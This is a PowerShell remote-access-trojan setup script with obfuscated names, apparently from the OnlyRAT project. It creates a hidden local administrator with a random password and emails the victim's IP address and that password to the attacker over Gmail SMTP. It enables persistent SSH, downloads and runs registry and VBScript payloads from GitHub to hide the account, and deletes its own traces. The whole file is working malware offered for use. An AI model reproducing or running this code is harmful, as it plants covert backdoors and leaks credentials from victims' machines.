# builds resources for rat
# created by : C0SM0

# random string for direcories
function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

# create local admin
function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# create local admin
Remove-LocalUser -Name "onlyrat"
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR

# varaibles
$FrNAQBWSnJ = RpLGWiUsIy
$qsQBioVOkY = "$env:temp\$FrNAQBWSnJ"
$NyZnoLKCIs = Get-Location
$CRYnrkaDbe = "$env:UserName.rat"
$oNumpPlFnH = Get-Content XbrMzmCUiE.txt
$XpKqtwxTVC = Get-Content UJbMLjTIDr.txt
$AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress

# writes config file
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
Add-Content -Path $CRYnrkaDbe -Value $qsQBioVOkY

# smtp process
Send-MailMessage -From $oNumpPlFnH -To $oNumpPlFnH -Subject $CRYnrkaDbe -Attachment $CRYnrkaDbe -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $oNumpPlFnH, (ConvertTo-SecureString -String $XpKqtwxTVC -AsPlainText -Force))

# goto temp, make working directory
mkdir $qsQBioVOkY
Set-Location $qsQBioVOkY

# enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# registry to hide local admin
$irlpLDVsMf = RpLGWiUsIy
Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/hide-user.reg -OutFile "$irlpLDVsMf.reg"

# visual basic script to register the registry
$gdOjqHVNDKeg = RpLGWiUsIy
Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/confirm-reg.vbs -OutFile "$gdOjqHVNDKeg.vbs"

# install the registry
Invoke-Expression "./$irlpLDVsMf.reg"; Invoke-Expression "./$gdOjqHVNDKeg.vbs"

# hide onlyrat user
Set-Location C:\Users
attrib +h +s +r onlyrat 

# self delete
Set-Location $NyZnoLKCIs
Remove-Item $CRYnrkaDbe
Remove-Item XbrMzmCUiE.txt
Remove-Item UJbMLjTIDr.txt
Remove-Item KFPGaEYdcz.ps1